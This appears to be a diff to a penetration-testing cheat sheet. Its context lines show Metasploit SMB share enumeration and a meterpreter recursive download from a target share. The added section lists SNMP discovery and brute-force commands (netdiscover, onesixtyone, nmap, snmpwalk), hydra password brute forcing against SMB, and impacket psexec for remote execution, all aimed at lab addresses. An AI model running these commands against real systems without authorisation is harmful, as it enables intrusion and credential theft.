@@ -862,6 +862,15 @@ msf auxiliary(tcp) > use auxiliary/scanner/smb/smb_enumshares
 msf auxiliary(smb_enumshares) > sessions -i 1
 C:\Windows\system32>net use K: \\172.30.111.10\FooComShare
 meterpreter > download K:\\ Target -r
-
-
+```
+##### SNMP Analysis
+```bash
+netdiscover -i tap0 -r 10.10.10.0/24
+netdiscover -i tap0 -S -L -f -r 10.10.10.0/24
+BRUTEFORCE SNMP
+onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.5
+nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.10.10.5
+snmpwalk -v 1 -c public 10.10.10.20
+hydra -L users.txt -P /usr/share/john/password.lst 10.10.10.20 smb -f -V
+With user/pass /home/bruiser/impacket/examples/psexec.py
 ```
